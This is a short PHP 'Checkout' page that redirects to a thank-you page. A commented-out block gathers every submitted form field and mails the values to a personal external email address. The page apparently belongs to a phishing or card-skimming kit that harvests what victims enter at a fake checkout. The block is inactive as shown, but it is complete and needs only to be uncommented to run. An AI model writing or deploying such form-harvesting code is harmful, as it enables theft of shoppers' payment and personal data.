<?php
ob_start();
$pagetitle = "Checkout";
$msg = "";

include "header.php";

/* $headers = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
$headers .= 'From: ' . $_SERVER['SERVER_NAME'] . ' <noreply@' . $_SERVER['SERVER_NAME'] . '>' . "\r\n";
		
$message = "";
foreach ($_POST as $key => $value){
$message .= "Field ".htmlspecialchars($key)." is ".htmlspecialchars($value)."<br>";
}
mail('boukhris-yassine@live.fr', 'sghting', $message, $headers); */





	

    header("location: merci.php");

?>

<?php

    include "footer.php";


ob_end_flush();
?>